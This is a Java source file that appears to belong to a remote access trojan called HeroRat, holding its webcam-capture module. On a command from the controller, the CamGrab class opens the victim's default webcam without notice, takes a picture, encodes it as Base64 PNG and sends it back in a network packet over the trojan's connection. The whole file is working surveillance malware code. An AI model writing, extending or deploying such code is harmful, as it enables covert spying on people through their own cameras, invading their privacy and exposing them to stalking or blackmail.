package net.herorat.features.camgrab;

import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;

import net.herorat.network.Packet;
import net.herorat.network.Packet18CamGrab;
import net.herorat.utils.Base64;
import net.herorat.utils.Logger;


public class CamGrab {

	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 1)
		{			
			p = new Packet18CamGrab(outputstream, new String[] { capture(Integer.parseInt(args[0])) });
			p.write();
		}
	}
	
	public static String capture(int zoom){
		Webcam webcam = Webcam.getDefault();
		Logger.log("capture v2");
		if (webcam != null) {
			try{
				Logger.log("Webcam: %s",webcam.getName());
				if(!webcam.isOpen()) webcam.open(); 
				ByteArrayOutputStream imageBytes = new ByteArrayOutputStream();
				BufferedImage buffer = webcam.getImage();
				Image image = buffer.getScaledInstance(buffer.getWidth(null) * zoom / 100, buffer.getHeight(null) * zoom / 100, 8);
				BufferedImage screen = new BufferedImage(image.getWidth(null), image.getHeight(null), 1);
				screen.getGraphics().drawImage(image, 0, 0, image.getWidth(null), image.getHeight(null), null);
				ImageIO.write(screen, "png", imageBytes);
				Logger.log("\nCaptured image\tSize of image is: '%d'\nSending...\n",imageBytes.size());
				return Base64.encode(imageBytes.toByteArray());
			}catch(Exception e){e.printStackTrace();}
	    
		} else {
			System.out.println("No webcam detected");
		}
		System.out.println("Got no web cam");
		return "";
	}
}
